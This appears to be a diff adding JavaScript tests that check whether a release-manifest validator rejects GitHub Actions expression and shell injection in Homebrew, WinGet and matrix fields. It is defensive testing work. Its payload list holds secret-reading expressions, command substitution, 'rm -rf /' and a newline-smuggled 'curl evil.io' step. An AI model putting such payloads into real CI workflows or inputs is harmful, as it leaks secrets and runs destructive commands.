@@ -96,3 +96,101 @@ test("rejects a malformed homebrew tap (must be owner/repo)", () => {
   });
   assert.equal(result.valid, false);
 });
+
+// F15 fix: manifest fields (homebrew.tap, homebrew.formulaName,
+// winget.packageIdentifier, matrix.os/node) flow verbatim into rendered
+// workflow YAML via render.mjs's literal string substitution, which does no
+// escaping. The re-validation proved a hostile `formulaName` containing
+// GitHub Actions expression syntax survived into rendered output — a
+// workflow-expression injection, not a cosmetic bug. Every property below
+// is checked against a FAMILY of hostile payloads (expression syntax,
+// command substitution, backticks, statement separators, newlines/CRLF —
+// not just the report's one literal example — because a fix that only
+// blocks that exact string would be exactly the failure this suite must
+// catch. Each field must reject every payload in the family.
+const HOSTILE_PAYLOADS = [
+  "${{ secrets.APPLE_CERTIFICATE }}",
+  "widgets${{secrets.X}}",
+  "`whoami`",
+  "$(whoami)",
+  "widgets; rm -rf /",
+  "widgets\nsteps:\n  - run: exit 1",
+  "widgets\r\nrun: curl evil.io",
+  'widgets"; secrets: ${{ secrets.X }}',
+  "widgets & echo pwned",
+  "widgets|echo pwned",
+];
+
+test("F15: publish.homebrew.formulaName rejects a family of injection payloads", () => {
+  for (const payload of HOSTILE_PAYLOADS) {
+    const result = validateManifest({
+      ...VALID_MINIMAL,
+      lanes: ["publish-package-managers"],
+      publish: {
+        homebrew: { tap: "acme/tap", formulaName: payload },
+        winget: { packageIdentifier: "Acme.Widgets" },
+      },
+    });
+    assert.equal(result.valid, false, `formulaName payload should be rejected: ${JSON.stringify(payload)}`);
+  }
+});
+
+test("F15: publish.homebrew.tap rejects a family of injection payloads", () => {
+  for (const payload of HOSTILE_PAYLOADS) {
+    const result = validateManifest({
+      ...VALID_MINIMAL,
+      lanes: ["publish-package-managers"],
+      publish: {
+        homebrew: { tap: `acme/${payload}`, formulaName: "widgets" },
+        winget: { packageIdentifier: "Acme.Widgets" },
+      },
+    });
+    assert.equal(result.valid, false, `tap payload should be rejected: ${JSON.stringify(payload)}`);
+  }
+});
+
+test("F15: publish.winget.packageIdentifier rejects a family of injection payloads", () => {
+  for (const payload of HOSTILE_PAYLOADS) {
+    const result = validateManifest({
+      ...VALID_MINIMAL,
+      lanes: ["publish-package-managers"],
+      publish: {
+        homebrew: { tap: "acme/tap", formulaName: "widgets" },
+        winget: { packageIdentifier: payload },
+      },
+    });
+    assert.equal(result.valid, false, `winget packageIdentifier payload should be rejected: ${JSON.stringify(payload)}`);
+  }
+});
+
+test("F15: matrix.os and matrix.node reject a family of injection payloads", () => {
+  for (const payload of HOSTILE_PAYLOADS) {
+    assert.equal(
+      validateManifest({ ...VALID_MINIMAL, matrix: { os: [payload], node: ["22.13"] } }).valid,
+      false,
+      `matrix.os payload should be rejected: ${JSON.stringify(payload)}`,
+    );
+    assert.equal(
+      validateManifest({ ...VALID_MINIMAL, matrix: { os: ["ubuntu-latest"], node: [payload] } }).valid,
+      false,
+      `matrix.node payload should be rejected: ${JSON.stringify(payload)}`,
+    );
+  }
+});
+
+// Non-regression: realistic, legitimate values using the characters real
+// GitHub/Homebrew/WinGet identifiers and runner/version labels actually use
+// must keep passing — the allowlist must not be so strict it breaks normal
+// configuration.
+test("F15 non-regression: realistic homebrew/winget/matrix values still validate", () => {
+  const result = validateManifest({
+    ...VALID_MINIMAL,
+    lanes: ["publish-package-managers"],
+    matrix: { os: ["ubuntu-latest", "self-hosted-linux"], node: ["22.13", "lts/*", "20.x"] },
+    publish: {
+      homebrew: { tap: "acme-inc/homebrew-tap", formulaName: "widgets++" },
+      winget: { packageIdentifier: "Acme.Widgets.Beta" },
+    },
+  });
+  assert.equal(result.valid, true, JSON.stringify(result.errors));
+});
